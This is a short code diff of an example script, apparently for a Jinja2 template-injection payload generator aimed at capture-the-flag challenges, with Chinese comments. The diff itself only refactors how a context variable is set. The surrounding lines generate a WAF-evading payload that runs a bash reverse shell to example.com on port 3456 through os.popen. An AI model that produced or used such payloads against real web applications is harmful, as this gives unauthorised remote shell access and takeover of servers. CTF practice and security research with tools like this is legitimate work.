@@ -75,8 +75,7 @@ def waf(s: str): # 这个函数因题目而定
 if __name__ == "__main__":
     full_payload_gen = FullPayloadGen(waf)
     full_payload_gen.do_prepare()
-    full_payload_gen.context["aaa"] = 100
-    full_payload_gen.context_payload += "{%set aaa=0x64%}"
+    full_payload_gen.add_context_variable("{%set aaa=0x64%}", {"aaa": 100})
     shell_payload, will_print = full_payload_gen.generate(OS_POPEN_READ, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
     if not will_print:
         print("这个payload不会产生回显")
